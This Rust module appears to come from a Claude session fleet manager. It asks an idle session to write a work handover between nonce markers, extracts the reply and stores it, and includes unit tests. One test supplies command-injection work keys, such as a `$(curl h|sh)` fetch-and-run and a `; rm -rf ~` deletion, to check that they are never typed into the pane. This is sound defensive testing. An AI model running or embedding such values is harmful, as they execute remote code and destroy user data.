//! Agent-written handover (work graph M9.3, decision D9: on demand only).
//!
//! A person asks a live session to write the hand-off the next session on
//! its work will need. Fleet types one prompt into the idle REPL asking for
//! the hand-off between two nonce-tagged marker lines — the safe-kill marker
//! pattern — and the next Stop hook reads it out of the turn's
//! `last_assistant_message` (the reply alone, so the prompt's own mention of
//! the markers can never be mistaken for it). The text is kept as a work
//! journal `note` from the `agent`, on the session's conversation, so it
//! outlives the session; the deterministic handover brief shows the newest
//! one first, inside its untrusted fence (Claude's words may quote anything
//! it read).
//!
//! * **Never automatic.** Only `work_link { action: handover }` asks; safe
//!   kill does not (D9).
//! * **Only an idle REPL.** `claude_status` must be `idle`: not while a turn
//!   runs, a dialog waits, the pane is stuck (the trust prompt above all),
//!   Claude has exited (`stopped` — the pane is a shell then) or its state is
//!   unknown, and not once the current conversation has ended. The prompt
//!   would land in the wrong place, or run as shell commands.
//! * **The key is quoted only when recognised.** Keys are free text; the
//!   prompt names one only when [`is_work_key`] accepts it.
//!
//! [`is_work_key`]: crate::service::work::recognize::is_work_key
//! * **One pending request per session.** The request is a timeline event
//!   (`handover_requested`, the nonce in its detail); the next Stop settles
//!   it — `handover_written`, or `handover_missing` when the reply had no
//!   markers — and a request older than [`PENDING_TTL_SECS`] no longer
//!   blocks a new one.
//! * **Bound to its turn.** The request also records the session's
//!   `prompt_submit_seq` before the prompt is typed; a Stop while that count
//!   has not moved on ends a turn that began before the request (a late
//!   Stop, a status that lagged), and leaves the request pending.
//! * **The markers stay out of the timeline.** The Stop hook's `turn_done`
//!   detail and `progress` journal row drop the marker block
//!   ([`strip_markers`]); the hand-off itself is kept once, as the note.
//! * **Never the operator's own session.**

use crate::ipc_error::{codes, lock, IpcError};
use crate::service::orgs::{self, OrgScope};
use crate::service::pane_intel::ClaudeStatus;
use crate::ssh::SshClient;
use crate::store::{SessionRow, Store};
use std::sync::{Arc, Mutex};

/// Timeline kinds of the request's life.
pub const EV_REQUESTED: &str = "handover_requested";
pub const EV_WRITTEN: &str = "handover_written";
pub const EV_MISSING: &str = "handover_missing";
pub const EV_SEND_FAILED: &str = "handover_send_failed";
const EV_KINDS: &[&str] = &[EV_REQUESTED, EV_WRITTEN, EV_MISSING, EV_SEND_FAILED];

/// A request older than this is abandoned: a new one may be made.
pub const PENDING_TTL_SECS: i64 = 30 * 60;
/// Longest stored hand-off (chars); the brief shows less.
pub const HANDOVER_MAX_CHARS: usize = 6_000;

const BEGIN: &str = "WORK_HANDOVER_BEGIN_";
const END: &str = "WORK_HANDOVER_END_";

/// PURE: the prompt typed into the session. The key is named only when it
/// is a shape the recogniser knows (`ABC-123`, `owner/repo#n`,
/// `asana:<gid>`): a key is free text, and the prompt is typed into a pane.
pub fn build_prompt(key: &str, nonce: &str) -> String {
    let what = if crate::service::work::recognize::is_work_key(key) {
        key
    } else {
        "this work item"
    };
    format!(
        "Please write a handover for the next session that will work on {what}. \
         Do not change any files or run anything for this; just write it. Cover: \
         what the work is, what is done, what is left, where things are (branch, \
         files, commands), decisions made and why, and anything that will trip \
         the next person up. Keep it under 400 words.\n\
         \n\
         Put the handover between these two lines, each on its own line and \
         outside any code block:\n  {BEGIN}{nonce}\n  {END}{nonce}"
    )
}

/// PURE: the hand-off between the markers of `nonce` in `reply`, trimmed and
/// capped; `None` when either marker is missing, out of order, or the text
/// between them is empty.
pub fn extract(reply: &str, nonce: &str) -> Option<String> {
    let begin = format!("{BEGIN}{nonce}");
    let end = format!("{END}{nonce}");
    let b = reply.find(&begin)?;
    let after = b + begin.len();
    let e = after + reply[after..].rfind(&end)?;
    let body = reply[after..e].trim_matches(|c: char| c.is_whitespace() || c == '`');
    if body.is_empty() {
        return None;
    }
    let body: String = body.chars().take(HANDOVER_MAX_CHARS).collect();
    Some(body)
}

/// PURE: `reply` without any handover marker block — each
/// `WORK_HANDOVER_BEGIN_<nonce>` … `WORK_HANDOVER_END_<nonce>` span, and a
/// stray marker of either kind — trimmed. What the Stop hook keeps as the
/// turn's detail: the hand-off is stored once, as the note.
pub fn strip_markers(reply: &str) -> String {
    /// Past a marker's prefix: the nonce (hex) ends at the first other char.
    fn after_token(s: &str) -> &str {
        let end = s
            .find(|c: char| !c.is_ascii_alphanumeric())
            .unwrap_or(s.len());
        &s[end..]
    }
    let mut out = String::with_capacity(reply.len());
    let mut rest = reply;
    loop {
        let next = [rest.find(BEGIN), rest.find(END)]
            .into_iter()
            .flatten()
            .min();
        let Some(at) = next else {
            out.push_str(rest);
            break;
        };
        out.push_str(&rest[..at]);
        let tail = &rest[at..];
        rest = match tail.strip_prefix(BEGIN) {
            // A block: everything through its end marker goes.
            Some(t) => match t.find(END) {
                Some(e) => after_token(&t[e + END.len()..]),
                None => after_token(t),
            },
            None => after_token(&tail[END.len()..]),
        };
    }
    out.trim().to_string()
}

/// A request's timeline detail: the nonce, then the `prompt_submit_seq` the
/// session had when it was made.
fn request_detail(nonce: &str, submit_seq: i64) -> String {
    format!("{nonce} {submit_seq}")
}

/// The pending request's nonce and the `prompt_submit_seq` it was made at
/// (`None` for a request recorded before M10.1), if the newest handover
/// event is a request younger than [`PENDING_TTL_SECS`].
fn pending(
    s: &Store,
    session_id: i64,
    now: i64,
) -> Result<Option<(String, Option<i64>)>, IpcError> {
    Ok(s.newest_session_event_of(session_id, EV_KINDS)?
        .filter(|e| e.kind == EV_REQUESTED && e.at > now - PENDING_TTL_SECS)
        .and_then(|e| e.detail)
        .map(|d| match d.split_once(' ') {
            Some((nonce, seq)) => (nonce.to_string(), seq.trim().parse().ok()),
            None => (d, None),
        }))
}

fn make_nonce() -> String {
    use rand::Rng;
    let mut buf = [0u8; 6];
    rand::rng().fill_bytes(&mut buf);
    buf.iter().map(|b| format!("{b:02x}")).collect()
}

/// Why this row cannot be asked now, if it cannot.
fn refusal(row: &SessionRow) -> Option<String> {
    if row.status != "running" {
        return Some(format!("{} is not running", row.tmux_name));
    }
    if matches!(row.kind.as_str(), "shell" | "external" | "bg") {
        return Some(format!(
            "{} has no Claude REPL fleet can type into",
            row.tmux_name
        ));
    }
    if row.claude_session_id.is_none() {
        return Some(format!("{} has no Claude conversation yet", row.tmux_name));
    }
    if let Some(k) = row.stuck_kind.as_deref() {
        return Some(format!(
            "{} is stuck ({k}); resolve that first",
            row.tmux_name
        ));
    }
    // Only a REPL known to be at its input prompt. Once Claude exits
    // (`stopped`, a crash) the tmux row stays `running` but the pane is a
    // shell, and the prompt plus Enter would run as commands.
    match row.claude_status.as_deref() {
        Some(s) if s == ClaudeStatus::Idle.as_str() => None,
        Some("working") => Some(format!("{} is busy; ask when its turn ends", row.tmux_name)),
        Some("blocked") => Some(format!(
            "{} is waiting on a dialog; answer it first",
            row.tmux_name
        )),
        Some(s) if s == ClaudeStatus::Stopped.as_str() => Some(format!(
            "{}'s Claude has exited; the pane is not a REPL fleet can type into",
            row.tmux_name
        )),
        Some(s) => Some(format!(
            "{} is {s}, not an idle Claude REPL; a handover needs one",
            row.tmux_name
        )),
        None => Some(format!(
            "{}'s Claude state is not known yet; a handover needs an idle REPL",
            row.tmux_name
        )),
    }
}

/// Why the row's current conversation rules a handover out: it has ended
/// (a SessionEnd closed it) or the row awaits a rebind after `/clear` /
/// `/resume`, so the conversation that would write it is not the one linked.
fn conversation_refusal(s: &Store, row: &SessionRow) -> Result<Option<String>, IpcError> {
    let Some(current) = row.claude_session_id.as_deref() else {
        return Ok(None);
    };
    if s.is_awaiting_rebind(row.id)?
        || s.get_conversation(row.id, current)?
            .is_some_and(|c| c.ended_at.is_some())
    {
        return Ok(Some(format!(
            "{}'s conversation has ended; ask once a new one is running",
            row.tmux_name
        )));
    }
    Ok(None)
}

/// `work_link { action: handover, session_id }`: ask the session to write
/// its hand-off. Returns the row. A per-host token asks only its own host's
/// sessions, and only about work inside its org.
pub async fn request(
    store: &Mutex<Store>,
    ssh: &Arc<SshClient>,
    session_id: i64,
    scope: &OrgScope,
) -> Result<SessionRow, IpcError> {
    let (row, nonce, key) = {
        let s = lock(store)?;
        let mut row = s.get_session_by_id(session_id)?.ok_or_else(|| {
            IpcError::new(codes::E_NOTFOUND, format!("session {session_id} not found"))
        })?;
        if let Some(h) = scope.host() {
            if row.host_alias != h || !scope.sees_row(&row) {
                return Err(orgs::not_found("session", session_id));
            }
        }
        crate::service::operator::refuse_if_operator(
            &s,
            &row.host_alias,
            &row.tmux_name,
            "handover",
        )?;
        scope.redact_row(&mut row);
        let key = row
            .work
            .as_ref()
            .and_then(|w| w.key.clone())
            .ok_or_else(|| {
                IpcError::new(
                    codes::E_INVALID,
                    format!(
                        "{} is not linked to any work; link it first, so the handover has a key",
                        row.tmux_name
                    ),
                )
            })?;
        let why = match refusal(&row) {
            Some(why) => Some(why),
            None => conversation_refusal(&s, &row)?,
        };
        if let Some(why) = why {
            return Err(IpcError::new(codes::E_NOT_ALIVE, why));
        }
        let now = crate::service::catalog::now_secs();
        if pending(&s, row.id, now)?.is_some() {
            return Err(IpcError::new(
                codes::E_EXISTS,
                format!("a handover is already requested from {}", row.tmux_name),
            ));
        }
        let nonce = make_nonce();
        // The turn this request starts is the first one submitted after it.
        let submit_seq = s
            .prompt_ack_state(row.id)?
            .map(|a| a.prompt_submit_seq)
            .unwrap_or(0);
        s.insert_session_event_for(
            row.id,
            row.claude_session_id.as_deref(),
            EV_REQUESTED,
            Some(&request_detail(&nonce, submit_seq)),
        )?;
        (row, nonce, key)
    };
    if let Err(e) = crate::service::sessions::send_system_prompt(
        &row.host_alias,
        &row.tmux_name,
        &build_prompt(&key, &nonce),
        true,
        store,
        ssh,
    )
    .await
    {
        if let Ok(s) = store.lock() {
            let _ = s.insert_session_event(row.id, EV_SEND_FAILED, Some(&e.message));
        }
        return Err(e);
    }
    let s = lock(store)?;
    let mut out = s
        .get_session_by_id(row.id)?
        .ok_or_else(|| IpcError::new(codes::E_NOTFOUND, "the session vanished"))?;
    scope.redact_row(&mut out);
    Ok(out)
}

/// The Stop hook's half, under its lock: settle a pending request from the
/// turn's reply. A Stop of a turn submitted before the request leaves it
/// pending. Returns whether a hand-off was stored.
pub fn on_stop(
    s: &Store,
    session_id: i64,
    claude_session_id: &str,
    reply: Option<&str>,
) -> Result<bool, IpcError> {
    let now = crate::service::catalog::now_secs();
    let Some((nonce, at_seq)) = pending(s, session_id, now)? else {
        return Ok(false);
    };
    if let Some(at) = at_seq {
        let seq = s
            .prompt_ack_state(session_id)?
            .map(|a| a.prompt_submit_seq)
            .unwrap_or(0);
        if seq <= at {
            // No prompt was submitted since the request: this Stop ends an
            // earlier turn, not the one asked for.
            return Ok(false);
        }
    }
    let Some(text) = reply.and_then(|r| extract(r, &nonce)) else {
        s.insert_session_event_for(session_id, Some(claude_session_id), EV_MISSING, None)?;
        return Ok(false);
    };
    s.journal_for_session(session_id, claude_session_id, "note", "agent", &text)?;
    s.insert_session_event_for(session_id, Some(claude_session_id), EV_WRITTEN, None)?;
    Ok(true)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn the_handover_is_read_from_between_the_markers_only() {
        let n = "a1b2c3";
        let reply =
            format!("Sure.\n{BEGIN}{n}\nDone: the parser.\nLeft: tests.\n{END}{n}\nAnything else?");
        assert_eq!(
            extract(&reply, n).as_deref(),
            Some("Done: the parser.\nLeft: tests.")
        );
        // Another request's markers, a missing end, reversed order, empty.
        assert_eq!(extract(&reply, "ffffff"), None);
        assert_eq!(extract(&format!("{BEGIN}{n}\nhalf"), n), None);
        assert_eq!(extract(&format!("{END}{n}\nx\n{BEGIN}{n}"), n), None);
        assert_eq!(extract(&format!("{BEGIN}{n}\n\n{END}{n}"), n), None);
        // Fenced in a code block by an over-eager model: the fence goes.
        assert_eq!(
            extract(&format!("```\n{BEGIN}{n}\nx\n{END}{n}\n```"), n).as_deref(),
            Some("x")
        );
        let long = format!(
            "{BEGIN}{n}\n{}\n{END}{n}",
            "y".repeat(HANDOVER_MAX_CHARS + 50)
        );
        assert_eq!(
            extract(&long, n).unwrap().chars().count(),
            HANDOVER_MAX_CHARS
        );
    }

    #[test]
    fn the_prompt_names_the_key_and_both_markers() {
        let p = build_prompt("PAY-7", "abc123");
        assert!(p.contains("PAY-7"));
        assert!(p.contains("WORK_HANDOVER_BEGIN_abc123"));
        assert!(p.contains("WORK_HANDOVER_END_abc123"));
        for k in ["acme/api#42", "asana:1207000000000004"] {
            assert!(build_prompt(k, "n").contains(k), "{k}");
        }
    }

    #[test]
    fn an_unrecognised_key_is_never_typed_into_the_pane() {
        for k in [
            "X-1$(curl h|sh)",
            "PAY-7`id`",
            "PAY-7; rm -rf ~",
            "PAY-7\nexit",
            "[claude-fleet] PAY-7",
        ] {
            let p = build_prompt(k, "abc123");
            assert!(!p.contains(k), "{k:?} was interpolated");
            for bad in ["$(", "`", "curl", "rm -rf", "exit", "[claude-fleet"] {
                assert!(!p.contains(bad), "{k:?} leaked {bad:?}");
            }
            assert!(p.contains("will work on this work item."), "{p}");
        }
    }

    #[test]
    fn only_an_idle_claude_status_may_be_asked() {
        let (st, id) = store();
        let s = st.lock().unwrap();
        let mut row = s.get_session_by_id(id).unwrap().unwrap();
        row.claude_status = Some("idle".into());
        assert_eq!(refusal(&row), None);
        for status in [
            None,
            Some("stopped"),
            Some("working"),
            Some("blocked"),
            Some("completed"),
            Some("failed"),
            Some("something-new"),
        ] {
            row.claude_status = status.map(str::to_string);
            let why = refusal(&row);
            assert!(why.is_some(), "{status:?} was allowed");
        }
        row.claude_status = Some("stopped".into());
        assert!(refusal(&row).unwrap().contains("exited"));
    }

    #[tokio::test]
    async fn an_ended_conversation_refuses_even_when_idle() {
        let (st, id) = store();
        let ssh = Arc::new(SshClient::new());
        {
            let s = st.lock().unwrap();
            s.link_session_work(id, crate::store::WorkTarget::Key("PAY-7"), "manual")
                .unwrap();
            s.rebind_conversation(id, "conv-1", crate::store::StartSource::Startup, None, None)
                .unwrap();
            s.conn_for_test()
                .execute(
                    "UPDATE sessions SET claude_status = 'idle' WHERE id = ?1",
                    [id],
                )
                .unwrap();
            s.close_conversation(id, "conv-1", "other").unwrap();
        }
        let err = request(&st, &ssh, id, &OrgScope::All).await.unwrap_err();
        assert_eq!(err.code, codes::E_NOT_ALIVE, "{}", err.message);
        assert!(
            err.message.contains("conversation has ended"),
            "{}",
            err.message
        );

        // Awaiting a rebind after /clear: refused too.
        let (st, id) = store();
        {
            let s = st.lock().unwrap();
            s.link_session_work(id, crate::store::WorkTarget::Key("PAY-7"), "manual")
                .unwrap();
            s.conn_for_test()
                .execute(
                    "UPDATE sessions SET claude_status = 'idle' WHERE id = ?1",
                    [id],
                )
                .unwrap();
            s.mark_awaiting_rebind(id).unwrap();
        }
        let err = request(&st, &ssh, id, &OrgScope::All).await.unwrap_err();
        assert_eq!(err.code, codes::E_NOT_ALIVE, "{}", err.message);
        // Nothing was recorded as requested.
        let s = st.lock().unwrap();
        assert!(s.newest_session_event_of(id, EV_KINDS).unwrap().is_none());
    }

    fn store() -> (Mutex<Store>, i64) {
        let s = Store::open_in_memory().unwrap();
        s.upsert_host("h").unwrap();
        let id = s
            .upsert_session("dev", "h", None, None, 1, 1, "running", None)
            .unwrap();
        s.set_claude_session_id(id, "conv-1").unwrap();
        (Mutex::new(s), id)
    }

    #[test]
    fn a_stop_settles_the_request_and_the_note_reaches_the_journal() {
        let (st, id) = store();
        let s = st.lock().unwrap();
        // Nothing pending: a Stop does nothing.
        assert!(!on_stop(&s, id, "conv-1", Some("hi")).unwrap());
        s.insert_session_event_for(id, Some("conv-1"), EV_REQUESTED, Some("n1"))
            .unwrap();
        let reply = format!("{BEGIN}n1\nLeft: docs.\n{END}n1");
        assert!(on_stop(&s, id, "conv-1", Some(&reply)).unwrap());
        let notes: Vec<_> = s
            .journal_for_conversations(&["conv-1".to_string()])
            .unwrap()
            .into_iter()
            .filter(|j| j.kind == "note")
            .collect();
        assert_eq!(notes.len(), 1);
        assert_eq!(notes[0].source, "agent");
        assert_eq!(notes[0].body.as_deref(), Some("Left: docs."));
        // Settled: the next Stop leaves it alone.
        assert!(!on_stop(&s, id, "conv-1", Some(&reply)).unwrap());

        // A reply without markers settles it as missing.
        s.insert_session_event_for(id, Some("conv-1"), EV_REQUESTED, Some("n2"))
            .unwrap();
        assert!(!on_stop(&s, id, "conv-1", Some("I did something else")).unwrap());
        let newest = s.newest_session_event_of(id, EV_KINDS).unwrap().unwrap();
        assert_eq!(newest.kind, EV_MISSING);
    }

    #[test]
    fn a_stop_of_an_earlier_turn_leaves_the_request_pending() {
        let (st, id) = store();
        let s = st.lock().unwrap();
        // Asked at submit count 0: no prompt has been submitted since.
        s.insert_session_event_for(id, Some("conv-1"), EV_REQUESTED, Some("n1 0"))
            .unwrap();
        // The turn that was running when fleet asked ends first, without
        // markers: not the reply asked for, and not "missing".
        assert!(!on_stop(&s, id, "conv-1", Some("earlier work done")).unwrap());
        let newest = s.newest_session_event_of(id, EV_KINDS).unwrap().unwrap();
        assert_eq!(newest.kind, EV_REQUESTED);
        // The handover prompt is submitted, then its turn's Stop settles it.
        s.record_prompt_submit_hook_for_row(id).unwrap();
        let reply = format!("{BEGIN}n1\nLeft: docs.\n{END}n1");
        assert!(on_stop(&s, id, "conv-1", Some(&reply)).unwrap());
        let newest = s.newest_session_event_of(id, EV_KINDS).unwrap().unwrap();
        assert_eq!(newest.kind, EV_WRITTEN);
    }

    #[test]
    fn the_marker_block_is_stripped_from_a_reply() {
        let n = "a1b2c3";
        assert_eq!(
            strip_markers(&format!(
                "Sure.\n{BEGIN}{n}\nDone: x.\n{END}{n}\nAnything else?"
            )),
            "Sure.\n\nAnything else?"
        );
        assert_eq!(strip_markers(&format!("{BEGIN}{n}\nonly\n{END}{n}")), "");
        // A stray marker of either kind, and a half block.
        assert_eq!(strip_markers(&format!("a {END}{n} b")), "a  b");
        assert_eq!(strip_markers(&format!("a\n{BEGIN}{n}\nb")), "a\n\nb");
        assert_eq!(strip_markers("no markers here"), "no markers here");
    }

    #[tokio::test]
    async fn a_request_needs_work_an_idle_repl_and_no_pending_one() {
        let (st, id) = store();
        let ssh = Arc::new(SshClient::new());
        let err = request(&st, &ssh, id, &OrgScope::All).await.unwrap_err();
        assert_eq!(err.code, codes::E_INVALID, "no work: {}", err.message);
        {
            let s = st.lock().unwrap();
            s.link_session_work(id, crate::store::WorkTarget::Key("PAY-7"), "manual")
                .unwrap();
            s.conn_for_test()
                .execute(
                    "UPDATE sessions SET claude_status = 'working' WHERE id = ?1",
                    [id],
                )
                .unwrap();
        }
        let err = request(&st, &ssh, id, &OrgScope::All).await.unwrap_err();
        assert_eq!(err.code, codes::E_NOT_ALIVE, "{}", err.message);
        // Claude exited (the pane is a shell) or its state is unknown.
        for status in ["'stopped'", "NULL"] {
            st.lock()
                .unwrap()
                .conn_for_test()
                .execute(
                    &format!("UPDATE sessions SET claude_status = {status} WHERE id = ?1"),
                    [id],
                )
                .unwrap();
            let err = request(&st, &ssh, id, &OrgScope::All).await.unwrap_err();
            assert_eq!(err.code, codes::E_NOT_ALIVE, "{status}: {}", err.message);
        }
        {
            let s = st.lock().unwrap();
            s.conn_for_test()
                .execute(
                    "UPDATE sessions SET claude_status = 'idle' WHERE id = ?1",
                    [id],
                )
                .unwrap();
            s.insert_session_event_for(id, Some("conv-1"), EV_REQUESTED, Some("n"))
                .unwrap();
        }
        let err = request(&st, &ssh, id, &OrgScope::All).await.unwrap_err();
        assert_eq!(err.code, codes::E_EXISTS, "{}", err.message);
        // Another host's token: the session reads as unknown.
        let other = OrgScope::Host {
            alias: "h2".into(),
            org: None,
            isolated: Default::default(),
        };
        let err = request(&st, &ssh, id, &other).await.unwrap_err();
        assert_eq!(err.code, codes::E_NOTFOUND);
    }
}
